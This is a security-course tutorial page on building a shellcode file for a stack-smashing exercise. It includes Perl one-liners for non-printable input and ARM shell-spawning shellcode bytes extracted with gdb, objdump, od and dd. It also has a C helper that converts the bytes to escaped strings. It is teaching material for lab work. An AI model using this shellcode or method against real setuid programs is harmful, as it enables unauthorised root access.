---
layout: page
title: 'Creating a Shellcode File'
---

<style>
  strong {
    font-size: larger;
    font-variant: small-caps;
    font-weight: bold;
  }
  table {
    border: solid 1px grey;
    border-collapse: collapse;
    border-spacing: 0;
  }
  table thead th {
    background-color: grey;
    border: solid 1px grey;
    color: white;
    padding: 10px;
    text-align: left;
  }
  table tbody td {
    border: solid 1px grey;
    color: #333;
    padding: 10px;
    text-shadow: 1px 1px 1px #fff;
  }
  blockquote {
    margin-left: 2em;
    margin-right: 2em;
  }
  .red {
        color: red;
  }
  .blue {
        color: blue;
  }
  hr.style12 {
        height: 6px;
        background: url(../images/hr-12.png) repeat-x 0 0;
    border: 0;
  }
  b {
    font-family: sans-serif;
        font-weight: 900;
  }
  .center {
        margin: auto;
        width: 100%;
        text-align: center;
  }
</style>

_Shellcode_ is a program, hidden in specially crafted input, that an attacker feeds to a vulnerable program.  It is called "shellcode" because it is commonly used to exploit a program in order to open a shell.  For setuid programs, being able to execute shellcode means that an attacker is able to open a shell with superuser privileges.

<hr style="border-color: purple;" />

## Unprintable characters

One form of shellcode takes the form of a binary file.  Such shellcode is usually fed into a program as string input.

While very clever attackers can sometimes generate shellcode that uses only printable characters, more often you will need to feed non-printable characters into a program's input.  A non-printable character is essentially a character that does not appear on screen when you type it.  For example, the `delete` character is not printable; in fact, the effect of processing the delete key is usually to _un_ print something.  Other so-called _control characters_, like `escape`, etc., are also not printable.

In a stack smashing attack, we take advantage of the fact that numbers and characters have the same underlying representations: byte values.  To exploit a program, we may need specific byte values to be stored in specific memory locations.  If some of these "characters" are non-printable, how do we "type" them so that we can give them to a program?  The answer is to use a file.  Instead of relying on an attacker to type these characters in, we store them into a file, and we feed that file as input to the program.

In short: we generate inputs programmatically and store them into a file.  Then, we feed the file into a program.

<hr class="style12" />

#### Example

Suppose I need to feed the following byte values to a program, where each pair of hexadecimal digits represents a byte:

```
61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 d8 f5 ff bf 34 84 04 08
```
Some of these byte values have printable, ASCII equivalents.  Let's substitute in a character for every byte that has a printable ASCII equivalent:

```
a b c d e f g h i j k l m n o p d8 f5 ff bf 34 84 04 08
```

Now what do we do with the rest of the characters?  If, instead of trying to type the characters directly, we _generate_ them using a program, we can get around the fact that they are non-printable.  The Perl programming language (among many others) has the ability to print non-printable characters using "character escapes".  Conveniently, all byte values can be printed using "hexadecimal escapes".

Even more conveniently, Perl lets us write mini-programs that can be executed directly on the command line.  For example, if we type the following into our shell:

```
$ perl -e 'print "helloworld\n"'
```

we see `helloworld` echoed in our shell.

**UNIX power tip**: Any program that prints to `STDOUT` can be redirected to print to a file using the `>` shell operator.  For example:

```
$ perl -e 'print "helloworld\n"' > hello_file
```

creates a file called `hello_file` containing `helloworld\n`.

Let's now print all those unprintable characters and save them to a file called `input`.

```
$ perl -e 'print "abcdefghijklmnop\xd8\xf5\xff\xbf\x34\x84\x04\x08"' > input
```

Note above that if we want to "print" the unprintable byte with byte value `0x84`, we just type `\x84` in Perl.

<hr style="border-color: purple;" />

## Where do our bytes come from?

You probably already know that at least a part of the bytes we use to overwrite a return address should contain a new return address.  But what about the rest of the bytes?  Well, think about this for a moment: when we overwrite a return address, what address do we put there?  If all you're trying to do is to make a program jump to a different function that already exists, then you can just put in that function's address.  But what if you want to make the program do something _totally new_?  In other words, what if you want to hijack the program to run code that _you wrote_?

First, we start by writing the program that we want to run.  We then obtain the machine code for our program.  During our attack, we will load this machine code into our attack buffer, overwrite a return address, and jump to code stored in our buffer.  This is why we have to disable the NX bit.  We're going to run code in a region that normally does not run code!

Note that this tutorial just tells you how to extract the machine code for your attack code.  It does not tell you which bytes in the attack code should contain the new return address, or where to put that new return address.  You will have to figure out those parts on your own!

<hr class="style12" />

### Using `gdb` to find a subroutine

How can we obtain the machine code for _one subroutine_?  We can do this using `gdb`.

First, compile your program.  Then run `gdb` as follows:

```
$ gdb shellcode.o
(gdb) disas /r main
Dump of assembler code for function main:
   0x00000000 <+0>:	02 20 22 e0	eor	r2, r2, r2
   0x00000004 <+4>:	28 10 8f e2	add	r1, pc, #40	; 0x28
   0x00000008 <+8>:	02 48 2d e9	push	{r1, r11, lr}
   0x0000000c <+12>:	01 48 bd e8	pop	{r0, r11, lr}
   0x00000010 <+16>:	07 20 c1 e5	strb	r2, [r1, #7]
   0x00000014 <+20>:	02 48 2d e9	push	{r1, r11, lr}
   0x00000018 <+24>:	04 b0 8d e2	add	r11, sp, #4
   0x0000001c <+28>:	0b 70 a0 e3	mov	r7, #11
   0x00000020 <+32>:	08 d0 4d e2	sub	sp, sp, #8
   0x00000024 <+36>:	0c 10 0b e5	str	r1, [r11, #-12]
   0x00000028 <+40>:	08 20 0b e5	str	r2, [r11, #-8]
   0x0000002c <+44>:	0c 10 4b e2	sub	r1, r11, #12
   0x00000030 <+48>:	ff ff ff ef	svc	0x00ffffff
End of assembler dump.
```

This view shows us which instructions start at which offsets.  Notice that we get both the machine code and instruction mnemonics in this view.  For example, `push {r1, r11, lr}` is represented by the hexadecimal word `02 48 2d e9` and is located at offset `0x00000008` in the file.

<hr class="style12" />

### Finding the virtual start and end addresses of a subroutine

Now, find the *start* and *end* addresses for that subroutine.  In the example above, the start is `0x00000000` and the end is `0x00000030`.  Remember, these addresses are in hexadecimal format.  We are going to verify that we found the correct address range by using a tool called `objdump` with those offsets.

In the command below, the `start-address` is inclusive, while the `stop-address` is exclusive (so we _add four bytes_ to the address):

```
$ objdump -d --start-address=0x00000000 --stop-address=0x00000034 shellcode.o

shellcode.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <main>:
   0:	e0222002 	eor	r2, r2, r2
   4:	e28f1028 	add	r1, pc, #40	; 0x28
   8:	e92d4802 	push	{r1, fp, lr}
   c:	e8bd4801 	pop	{r0, fp, lr}
  10:	e5c12007 	strb	r2, [r1, #7]
  14:	e92d4802 	push	{r1, fp, lr}
  18:	e28db004 	add	fp, sp, #4
  1c:	e3a0700b 	mov	r7, #11
  20:	e24dd008 	sub	sp, sp, #8
  24:	e50b100c 	str	r1, [fp, #-12]
  28:	e50b2008 	str	r2, [fp, #-8]
  2c:	e24b100c 	sub	r1, fp, #12
  30:	efffffff 	svc	0x00ffffff
```

That looks right!  We have two small problems, though.

First, `objdump` "helpfully" tries to interpret the instructions as integer words.  This isn't fundamentally a problem, but it does mean that the byte representation of each instruction is displayed as an integer.  For example, `eor r2, r2, r2` is shown as the hexadecimal `e0222002`.  In reality, this instruction is stored as the little-endian `02 20 22 e0`.  Keep that in mind as you use `objdump`.

Second, `gdb` and `objdump` are trying to be helpful by showing us the addresses of that code _once the program is loaded into memory_.  Those offsets are _virtual memory offsets_.  What we're looking for right now, though, are the offsets of the program _on disk_, before it is loaded, so that we can extract those bytes to a file.  Looks like we have to do a little more work.

<hr class="style12" />

### Finding the on-disk start and end addresses of a subroutine

The easiest way to find on-disk offsets is to convert the compiled binary program into a sequence of hex digits and then to search for the sequence of digits corresponding to your function.  Note that `od` _shows the true little-endian stored representation of an instruction_.  For example, the beginning of the above program is `02 20 22 e0`.

Convert your compiled program to hex numbers and save it in a file:

```
$ od -tx1 -A d shellcode.o > shellcode.hex
```

Open the `.hex` file in your favorite editor and look for the start of your function, i.e., `02 20 22 e0`.  In my program the `main` function appears in this snippet.  Do you see `02 20 22 e0`?

```
0000048 08 00 07 00 02 20 22 e0 28 10 8f e2 02 48 2d e9
0000064 01 48 bd e8 07 20 c1 e5 02 48 2d e9 04 b0 8d e2
0000080 0b 70 a0 e3 08 d0 4d e2 0c 10 0b e5 08 20 0b e5
0000096 0c 10 4b e2 ff ff ff ef 2f 62 69 6e 2f 71 68 41
```

The numbers all the way to the left are _decimal_ offsets into the _binary file_.  Since our function starts with `02`, which is `4` bytes in, we now know that our function begins at decimal offset `52`.

<hr class="style12" />

### Finding the size of the function

We also need to know how big the function is.  Each line of `gdb`&#39;s output tells us at which address that line's disassembly starts.  Since the first line of `main` starts at `0x00000000`, that's our start address.  What's the end address?  Let's look at the last line:

```
...
   0x00000030 <+48>:	ff ff ff ef	svc	0x00ffffff
End of assembler dump.
```

The last line starts at `0x00000030`.  That does not mean that the end address is `0x00000030`.  It means that we need to count the number of bytes for that line and add them to the address.  In our case, this line is a single machine instruction, `ff ff ff ef`, which corresponds with the mnemonic, `svc`.  So our end address is `0x00000030 + 0x4`, which is `0x00000034`.

How many bytes is that?  Easy: `end` - `start` = `0x00000034` - `0x00000000` = `0x34` = `52` bytes.

<hr class="style12" />

### Extracting bytes

So finally, we copy `52` bytes starting at offset `52` using the `dd` tool, which is a copy utility that lets us work with raw bytes on disk.  Note that `dd` needs all offsets and counts to be in decimal:

```
$ dd if=shellcode.o of=shellcode_main.bin bs=1 skip=52 count=52
```
where `if` stands for "input file", `of` stands for "output file", `bs` stands for "block size" (where `1` is a _byte_), `skip` says where to _start_ reading, and `count` specifies how many blocks (bytes in this case) to copy.

We can verify that `main.bin` contains the desired function by running `od` again:

```
$ od -tx1 -A d shellcode_main.bin 
0000000 02 20 22 e0 28 10 8f e2 02 48 2d e9 01 48 bd e8
0000016 07 20 c1 e5 02 48 2d e9 04 b0 8d e2 0b 70 a0 e3
0000032 08 d0 4d e2 0c 10 0b e5 08 20 0b e5 0c 10 4b e2
0000048 ff ff ff ef
0000052
```
Looks good!

<hr class="style12" />

### Storing your shellcode in a more convenient format

We will probably need to modify the binary that we extracted in small ways in order to make our attack work.  It is inconvenient to work directly with the binary file.  Instead, we can convert it into a string that uses hex escapes.  We can then edit that string as we wish, and then use Perl to convert it back to binary.

Although we could convert our binary into hex escapes by hand, doing so is both tedious and error prone.  Instead, let's write a program.  Here's a C program that takes a binary file as its first argument and then generates an escaped hex string.

```
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv) {
  char *filename = argv[1];
  FILE *file = fopen(filename, "r");

  char byte = '\0';
  while(fread(&byte, 1, 1, file) != 0) {
    printf("\\x%02hhx", byte);
  }
  printf("\n");
  return 0;
}
```

After compiling this program, we run:

```
$ ./byte_to_hex shellcode_main.bin
```

and get

```
\x02\x20\x22\xe0\x28\x10\x8f\xe2\x02\x48\x2d\xe9\x01\x48\xbd\xe8\x07\x20\xc1\xe5\x02\x48\x2d\xe9\x04\xb0\x8d\xe2\x0b\x70\xa0\xe3\x08\xd0\x4d\xe2\x0c\x10\x0b\xe5\x08\x20\x0b\xe5\x0c\x10\x4b\xe2\xff\xff\xff\xef
```

Now you can tinker with the string directly in your text editor, and when you want to generate a new binary file, just give it to Perl:

```
$ perl -e 'print "\x02\x20\x22\xe0\x28\x10\x8f\xe2\x02\x48\x2d\xe9\x01\x48\xbd\xe8\x07\x20\xc1\xe5\x02\x48\x2d\xe9\x04\xb0\x8d\xe2\x0b\x70\xa0\xe3\x08\xd0\x4d\xe2\x0c\x10\x0b\xe5\x08\x20\x0b\xe5\x0c\x10\x4b\xe2\xff\xff\xff\xef"' > attack
```
